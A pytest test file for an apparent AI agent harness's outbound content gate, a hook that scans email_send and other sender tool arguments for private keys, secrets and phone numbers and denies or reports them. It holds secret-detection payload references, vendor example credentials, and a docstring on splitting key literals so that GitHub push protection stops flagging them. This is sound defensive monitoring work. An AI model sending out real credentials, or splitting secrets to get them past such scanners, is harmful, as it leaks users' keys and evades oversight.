    With the attribution written as a same-file grep, this fixture passes — the
    module contains both strings. It has to fail, because the only reason this
    finder exists is that a guard can be installed on one dispatch path and on no
    other and every same-file test still reads green.
    """
    base = tmp_path / "pkg"
    (base / "app" / "routers").mkdir(parents=True)
    (base / "app" / "routers" / "messages.py").write_text(
        "from app.harness.hooks import HookRegistry\n"
        "from app.harness.outbound_content import install_outbound_content_gate\n"
        "def a():\n"
        "    hooks = HookRegistry()\n"
        "    install_outbound_content_gate(hooks)\n"
        "def b():\n"
        "    other = HookRegistry()\n"
        "    return RunOptions(mcp_servers=SERVERS, hooks=other)\n")
    found = OC.unarmed_dispatch_paths(base)
    assert len(found) == 1, found
    assert found[0].line == 8, found[0].line


def test_a_splat_cannot_be_counted_as_arming(tmp_path):
    """`**kwargs` is opaque: only a literal `hooks=` keyword arms a build.

    Every production call site splats `_get_harness_kwargs()`, and that helper
    resolves `harness.*` config into RunOptions kwargs — none of which is `hooks`.
    Treating a splat as possibly-arming would make the finder vacuous on exactly
    the files that matter, so arming must be written at the call.
    """
    base = tmp_path / "pkg"
    (base / "app").mkdir(parents=True)
    (base / "app" / "x.py").write_text(
        "def f():\n"
        "    hooks = HookRegistry()\n"
        "    install_outbound_content_gate(hooks)\n"
        "    return RunOptions(mcp_servers=SERVERS, **kwargs)\n")
    found = OC.unarmed_dispatch_paths(base)
    assert [(f.file, f.reason) for f in found] == [
        ("app/x.py", OC.FINDING_NO_REGISTRY)], found


def test_a_turn_that_registers_no_mcp_server_is_not_a_sender_path(tmp_path):
    """Why `app/routers/ide.py` is not in the roster, checked not asserted.

    `RunOptions.mcp_servers` defaults to an empty dict, so a build that passes
    neither `mcp_servers` nor a splat that could carry it exposes no tool a tier-2
    sender could be among. Excluding such a build from the denominator is a claim
    about a default, so the default is pinned here as well: if `mcp_servers` ever
    gains a default that registers servers, this test fails and the IDE helpers
    become dispatch paths in the same pass.
    """
    from app.harness.options import RunOptions as _RO
    assert _RO(model="x").mcp_servers == {}, (
        "the empty-mcp_servers premise moved; ide.py is a dispatch path now")

    base = tmp_path / "pkg"
    (base / "app").mkdir(parents=True)
    (base / "app" / "ide.py").write_text(
        "def _ask_lloyd():\n"
        "    return RunOptions(prompt='x', model='m', max_turns=1)\n")
    assert OC.unarmed_dispatch_paths(base) == []
    assert OC.dispatch_files_missing_from_arm_points(base) == []
    assert OC.sender_unreachable_dispatch_files(base) == ["app/ide.py"]
    # The exclusion is per-build, not per-file: add a server and the same file is
    # an unarmed path and a roster gap at once, with no allowlist to update.
    (base / "app" / "ide.py").write_text(
        "def _ask_lloyd():\n"
        "    return RunOptions(prompt='x', mcp_servers=SERVERS)\n")
    assert [f.file for f in OC.unarmed_dispatch_paths(base)] == ["app/ide.py"]
    assert OC.dispatch_files_missing_from_arm_points(base) == ["app/ide.py"]
    assert OC.sender_unreachable_dispatch_files(base) == []


def test_the_unarmed_paths_on_the_real_tree_are_the_unreachable_ones():
    """Positive control over the real tree, not over a fixture I wrote.

    The exclusion above must be *doing* something on the live checkout: the two
    IDE builds are found, are excluded, and the excluded set is exactly them. A
    finder that excluded everything, or nothing, would satisfy every other test
    here while measuring nothing — so the counts are pinned against the tree.
    """
    builds = OC.all_turn_builds()
    assert len(builds) == 12, len(builds)
    unreachable = sorted({b.file for b in builds if not b.sender_reachable})
    assert unreachable == ["app/routers/ide.py"], unreachable
    assert OC.sender_unreachable_dispatch_files() == unreachable
    assert len(OC.dispatch_registry_sites()) == 10, OC.dispatch_registry_sites()
    assert len(OC.GATE_ARM_POINTS) == len(
        set(OC.dispatch_registry_sites_files()) | {OC.FLOOR_MODULE})


def test_a_stale_entry_is_caught_even_when_the_grep_still_hits(tmp_path):
    """The rots-that-a-substring-check-cannot-see: the installer call is deleted
    from a file that still mentions it.

    `app/harness/safety.py` in particular defines `install_default_safety_hook`,
    so a substring staleness check passes on it unconditionally and the roster
    could lose the floor's own arming with nothing failing.
    """
    base = tmp_path / "pkg"
    (base / "app" / "harness").mkdir(parents=True)
    (base / "app" / "routers").mkdir(parents=True)
    (base / "app" / "harness" / "safety.py").write_text(
        "def install_default_safety_hook(h):\n"
        "    pass  # the gate call was removed here\n")
    (base / "app" / "routers" / "messages.py").write_text(
        "from app.harness.hooks import HookRegistry\n"
        "hooks = HookRegistry()\n"
        "def a():\n"
        "    return RunOptions(mcp_servers=SERVERS, hooks=hooks)\n")
    # Every other arm point gets a real installer call first, so the expected set
    # is exactly the two defects and not 'every file this fixture never wrote'.
    for rel in OC.GATE_ARM_POINTS:
        if rel in (OC.FLOOR_MODULE, "app/routers/messages.py"):
            continue
        arm = base / rel
        arm.parent.mkdir(parents=True, exist_ok=True)
        arm.write_text("install_default_safety_hook(hooks)\n")
    assert OC.stale_gate_arm_points(base) == [
        OC.FLOOR_MODULE, "app/routers/messages.py"], OC.stale_gate_arm_points(base)


def test_the_floor_installer_alones_cannot_be_a_third_convention(tmp_path):
    """`install_default_safety_hook` is the one installer every interactive path
    already calls, so the gate hangs off it — a path that installs the floor is
    covered even if it never names the gate."""
    base = tmp_path / "pkg"
    (base / "app").mkdir(parents=True)
    (base / "app" / "router.py").write_text(
        "from app.harness.hooks import HookRegistry\n"
        "from app.harness.safety import install_default_safety_hook\n"
        "hooks = HookRegistry()\n"
        "install_default_safety_hook(hooks)\n"
        "options = RunOptions(mcp_servers=SERVERS, hooks=hooks)\n")
    assert OC.unarmed_dispatch_paths(base) == []


def test_a_registry_with_no_turn_build_is_a_hook_builder_not_a_dispatch_path(
        tmp_path):
    """A file that builds a registry but builds no turn is a hook supplier.

    Requiring a registry mention made a whole class of real path invisible (the
    voice router), but dropping the requirement entirely would report every hook
    builder in the tree. The rule is: report the build, and exempt the file only
    when nothing in it builds a turn.
    """
    base = tmp_path / "pkg"
    (base / "app" / "harness").mkdir(parents=True)
    (base / "app" / "harness" / "hooks_supply.py").write_text(
        "def build():\n"
        "    hooks = HookRegistry()\n"
        "    install_default_safety_hook(hooks)\n"
        "    return hooks\n")
    assert OC.unarmed_dispatch_paths(base) == []
    # Not merely absent from the deny report — it is not a dispatch path, so it is
    # in no denominator at all and the roster check never asks for it either.
    assert OC.dispatch_registry_sites_files(base) == set()
    assert OC.dispatch_files_missing_from_arm_points(base) == []


def test_a_registry_from_the_caller_counts_when_the_caller_arms_it(tmp_path):
    """A pass-through parameter is credited only if a call site in the tree arms.

    The conservative half: a function that receives a registry it did not build
    cannot be judged from its own body, so the credit comes from the callers the
    same scan can see. A helper nobody calls is reported, which is the right
    direction for a guard: a false report gets read and dismissed, a false clear
    ships the hole.
    """
    base = tmp_path / "pkg"
    (base / "app").mkdir(parents=True)
    (base / "app" / "factory.py").write_text(
        "def build_options(hooks):\n"
        "    return RunOptions(mcp_servers=SERVERS, hooks=hooks)\n")
    # `hooks-not-armed`, not `options-built-without-hooks`: the build does name a
    # registry, it just never receives one an installer has armed.
    assert [f.reason for f in OC.unarmed_dispatch_paths(base)] == [
        OC.FINDING_UNARMED]
    (base / "app" / "caller.py").write_text(
        "def go():\n"
        "    hooks = HookRegistry()\n"
        "    install_default_safety_hook(hooks)\n"
        "    return build_options(hooks=hooks)\n")
    assert OC.unarmed_dispatch_paths(base) == []
    # And not by name-matching alone: a caller that passes an *unarmed* registry
    # leaves the helper reported.
    (base / "app" / "caller.py").write_text(
        "def go():\n"
        "    hooks = HookRegistry()\n"
        "    return build_options(hooks=hooks)\n")
    # `hooks-not-armed`, not `options-built-without-hooks`: the build does name a
    # registry, it just never receives one an installer has armed.
    assert [f.reason for f in OC.unarmed_dispatch_paths(base)] == [
        OC.FINDING_UNARMED]


def test_the_finder_ignores_test_and_vendored_trees(tmp_path):
    """If the finder read `tests/`, every test fixture in the repo would be an
    unarmed dispatch path — including this file. Test and vendored trees are
    excluded by path, not by name-matching their contents.
    """
    base = tmp_path / "pkg"
    (base / "tests").mkdir(parents=True)
    (base / ".venvs" / "vendor").mkdir(parents=True)
    body = ("hooks = HookRegistry()\n"
            "options = RunOptions(mcp_servers=SERVERS, hooks=hooks)\n")
    (base / "tests" / "fixture_thing.py").write_text(body)
    (base / ".venvs" / "vendor" / "thing.py").write_text(body)
    assert OC.find_unarmed_dispatch_paths(base) == []
    assert OC.dispatch_registry_sites(base) == []


def test_the_gate_is_installed_on_the_default_safety_floor():
    """The mechanism that covers every chat turn, subagent and IV turn at once.

    `install_default_safety_hook` is the one installer every interactive path
    already calls; putting the gate inside it is what stops this becoming a
    fourth per-call-site convention, and it means the Bash floor and the payload
    gate can no longer be armed independently.
    """
    hooks = HookRegistry()
    install_default_safety_hook(hooks)
    out = _fire(hooks, "email_send", DENY_PAYLOADS["private-key-material"])
    assert _decision(out) == "deny", out
    assert "private-key-material" in _reason(out)
    # ...and the Bash floor is intact: adding a guard must not displace one.
    assert _decision(_fire(hooks, "Bash",
                           {"command": "echo hi"})) == "allow"


@pytest.mark.parametrize("rel", list(OC.PACKAGE_ROOTS))
def test_the_scanned_roots_actually_exist(rel):
    """A finder over a directory that does not exist reports a clean tree.

    Zero hits from a path that resolved is evidence; zero hits from a path that
    did not is the catalogued false-negative class, and this test is the positive
    control that keeps the finder's `== []` an answer.
    """
    assert (REPO / rel).is_dir(), f"{rel} is in PACKAGE_ROOTS but is not a directory"
# ---------------------------------------------------------------------------
# Fail-closed behaviour on the scan itself
# ---------------------------------------------------------------------------


def test_an_unusable_scanner_denies_instead_of_passing(monkeypatch):
    """Detection failing open would be the fail-open this gate exists to remove.

    The distinction that keeps this honest: a broken *scan* denies, because the
    payload is a sender's and unexamined; a broken *ledger* never denies,
    because a reporting failure is not a reason to block. Both directions are
    pinned, because the tempting bug is the second one.
    """
    def boom(_args):
        raise RuntimeError("scan exploded")

    monkeypatch.setattr(OC, "scan_outbound_payload", boom)
    out = _fire(_content_only(scope=WORKER), "email_send",
                {"body": "anything"}, scope=WORKER)
    assert _decision(out) == "deny", out
    assert "could not be evaluated" in _reason(out)


def test_an_unwritable_ledger_never_blocks(tmp_path, monkeypatch):
    monkeypatch.setenv(OC.FINDINGS_ENV, str(tmp_path / "blocked"))
    (tmp_path / "blocked").write_text("not a directory", encoding="utf-8")
    out = _fire(_content_only(scope=WORKER), "email_send",
                REPORT_PAYLOADS["phone-number-e164"], scope=WORKER)
    assert _decision(out) == "allow", out


def test_a_tier1_call_skips_the_scan_entirely(monkeypatch):
    """Not just 'findings are ignored' — the work does not happen. A nightly job
    that reads a 400 KB note into a `vault_read` argument must not pay for a
    scan of content it is fetching rather than sending."""
    calls = []
    real = OC.scan_outbound_payload

    def spy(args):
        calls.append(args)
        return real(args)

    monkeypatch.setattr(OC, "scan_outbound_payload", spy)
    _fire(_content_only(scope=CHAT), "vault_read", {"path": "/tmp/x"})
    assert calls == []
    _fire(_content_only(scope=CHAT), "email_send", {"body": "hi"})
    assert len(calls) == 1


def test_the_scan_is_pure_and_deterministic():
    """Same arguments, same findings: required for a replay to be a measurement,
    and the reason no model sits on this path."""
    args = {"body": f"{PRIVATE_KEY_FOOTER}\n{ASSIGNED_SECRET_SENTINEL}\n"
                    f"call {PHONE_SENTINEL} at {TAILNET_SENTINEL}"}
    first = [(f.rule, f.arg, f.excerpt) for f in OC.scan_outbound_payload(args)]
    for _ in range(3):
        assert [(f.rule, f.arg, f.excerpt)
                for f in OC.scan_outbound_payload(args)] == first
    assert any(f.action == "deny" for f in OC.scan_outbound_payload(args))


def test_an_argument_the_scan_cannot_read_in_full_is_reported():
    """The size bound is a hole, so the hole is named rather than assumed away.

    Silent truncation would make the gate's clean verdict mean 'clean in the
    first 64 KiB', which is exactly the kind of claim that survives a review
    only because nobody re-measures it. It reports and never denies: the
    consequence of a long legitimate body is a ledger row, not a broken job.
    """
    oversized = "x" * (OC.MAX_SCAN_CHARS + 1000) + "\n" + PRIVATE_KEY_FOOTER
    findings = OC.scan_outbound_payload({"body": oversized})
    hits = [f for f in findings if f.rule == OC.OVERSIZED_FINDING]
    assert hits, findings
    assert hits[0].arg == "body" and hits[0].action == "report"
    # and the secret past the bound is genuinely not matched by a rule
    assert not [f for f in findings if f.action == "deny"], findings


def test_a_oversized_argument_still_dispatches():
    args = {"body": "x" * (OC.MAX_SCAN_CHARS + 10)}
    out = _fire(_content_only(scope=WORKER), "email_send", args, scope=WORKER)
    assert _decision(out) == "allow", out


# ---------------------------------------------------------------------------
# Exempt list — what an exemption does, and what a malformed one does not
# ---------------------------------------------------------------------------

EXEMPT_SCOPE = "worker:replay-corpus"
GOOD_REASON = ("replays the documented-attack corpus nightly; private-key "
               "fixtures are the payload under test, see backlog #1136")


def test_an_exempt_scope_is_not_scanned_at_all():
    """The exemption skips the scan, so it skips the record too.

    This is the semantics, pinned rather than described: a credential in an
    exempt scope's body neither denies nor produces a ledger row. The module
    comment used to claim exempt scopes were "scanned, recorded, not blocked",
    which the code never did — the review rung caught the contradiction on the
    first attempt, and a comment that promises more than the callback does is
    worse than no comment, because the next reader trusts it.
    """
    hooks = HookRegistry()
    OC.install_outbound_content_gate(hooks, scope=EXEMPT_SCOPE,
                                     exempt_scopes={EXEMPT_SCOPE: GOOD_REASON})
    out = _fire(hooks, "email_send", DENY_PAYLOADS["private-key-material"],
                scope=EXEMPT_SCOPE)
    assert _decision(out) == "allow", out
    assert not Path(OC.findings_path()).exists(), \
        "an exempt call is not scanned, so there is nothing to record"


def test_an_exempt_entry_with_a_blank_reason_does_not_open_the_gate():
    """A reason is what makes an exemption arguable; without one it is not applied.

    The inverse of the test above, and the one that keeps the first honest: if a
    stub reason exempted the scope, the reason field would be decorative and the
    `PHANTOM_EXEMPT` convention this copies would be a comment.
    """
    for stub in ("", "   ", "n/a", "see ticket"):
        hooks = HookRegistry()
        OC.install_outbound_content_gate(hooks, scope=EXEMPT_SCOPE,
                                         exempt_scopes={EXEMPT_SCOPE: stub})
        out = _fire(hooks, "email_send", DENY_PAYLOADS["private-key-material"],
                    scope=EXEMPT_SCOPE)
        assert _decision(out) == "deny", (stub, out)
        assert "private-key-material" in _reason(out), stub


def test_an_exempt_scope_for_one_scope_does_not_cover_another():
    """Exact match only: a prefix rule would let `worker` exempt the whole
    fleet, which is the thing the per-task grant system exists to prevent."""
    # `scope=None`: the callback must take the scope from the contextvar the way
    # a real dispatch does, or the test would compare one scope against itself.
    hooks = HookRegistry()
    OC.install_outbound_content_gate(hooks, exempt_scopes={EXEMPT_SCOPE: GOOD_REASON})
    assert _decision(_fire(hooks, "email_send",
                           DENY_PAYLOADS["private-key-material"],
                           scope=EXEMPT_SCOPE)) == "allow"
    out = _fire(hooks, "email_send", DENY_PAYLOADS["private-key-material"],
                scope="worker:other-task")
    assert _decision(out) == "deny", out
    assert "private-key-material" in _reason(out)


# ---------------------------------------------------------------------------
# Documentation credentials — exempt at runtime, and not a raw literal on disk
# ---------------------------------------------------------------------------

#: The exemptions this test REQUIRES, spelled out rather than read back from
#: the set under test. Iterating `EXEMPT_LITERALS` alone is vacuous for the
#: case that matters: delete an entry and the loop simply stops testing it, so
#: a silently-dropped exemption passes. Measured, not supposed — the first cut
#: of this test did exactly that, and only the Stripe pair's own membership
#: assertion caught the deletion. The Stripe entries are joined from halves
#: for the reason `test_no_exempt_literal_is_a_raw_live_prefixed_string_on_disk`
#: gives.
REQUIRED_EXEMPT = (
    "AKIAIOSFODNN7EXAMPLE",
    "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
    "sk_" + "live_" + "4eC39HqLyjWDarjtT1zdp7dc",
    "sk_" + "test_" + "4eC39HqLyjWDarjtT1zdp7dc",
)


def test_documentation_credentials_are_exempt_from_their_own_rules():
    """The exemption itself, which nothing pinned until 2026-09-20.

    `EXEMPT_LITERALS` is the set a rule must NOT fire on: the example keys that
    appear in vendor documentation. It is consulted before any guard runs, so
    a payload quoting Stripe's or AWS's published key is not a finding. Pinned
    through `scan_outbound_payload` rather than by reading the set, because
    membership is only half of it — the lookup is `token.upper() in ... or
    token in ...` against whatever `_candidate_text` extracted, and a literal
    that survives the set but not the extraction would exempt nothing.

    Two directions, and the first is the one that catches a deletion:
    everything in `REQUIRED_EXEMPT` must be exempt, and everything the module
    claims is exempt must actually be.
    """
    for literal in REQUIRED_EXEMPT:
        assert literal in OC.EXEMPT_LITERALS, (
            f"{literal!r} was dropped from EXEMPT_LITERALS; documentation's own "
            "example credential would now be reported as a finding")

    for literal in sorted(set(REQUIRED_EXEMPT) | set(OC.EXEMPT_LITERALS)):
        findings = OC.scan_outbound_payload({"body": f"key is {literal} here"})
        assert findings == [], (
            f"{literal!r} must be exempt but produced {findings}")


def test_the_stripe_pair_survives_being_split():
    """The split is an encoding of the same strings, not a change to them.

    Written because the fix for the blocked push edits the *source form* of
    two entries, and the failure it must not cause is silent: a typo in either
    half leaves a set that still looks right and exempts nothing. Joined here
    the same way the module joins them.
    """
    assert "sk_live_" + "4eC39HqLyjWDarjtT1zdp7dc" in OC.EXEMPT_LITERALS
    assert "sk_test_" + "4eC39HqLyjWDarjtT1zdp7dc" in OC.EXEMPT_LITERALS


def test_no_exempt_literal_is_a_raw_live_prefixed_string_on_disk():
    """The rule that keeps this module pushable.

    Its job is to hold credential-shaped strings, and GitHub's push protection
    scans the raw file — on 2026-09-20 two `sk_live_`/`sk_test_` entries
    blocked a push of 34 commits (`GH013`, commit `904f0bac`). Protection
    scans every commit in a push, so a later cleanup does not unblock the
    earlier commit; the escape hatches are a per-secret unblock URL or
    rewriting history, and this repo's history is what the automod ledger, the
    LKG and every rollback target are keyed on. So the literal must not reach
    disk joined.

    The needles are built by concatenation for exactly the same reason — a
    test that spelled them out would block the next push itself, which is the
    failure mode it exists to prevent, one file over.
    """
    src = (Path(__file__).resolve().parent.parent /
           "app" / "harness" / "outbound_content.py").read_text(encoding="utf-8")
    for prefix, body in (("sk_" + "live_", "4eC39HqLyjWDarjtT1zdp7dc"),
                         ("sk_" + "test_", "4eC39HqLyjWDarjtT1zdp7dc")):
        assert prefix + body not in src, (
            f"{prefix}… is a raw literal in outbound_content.py and will block "
            "the next push; split it across a `+` as the others are")
        assert prefix in src, "the split halves must still be there to join"
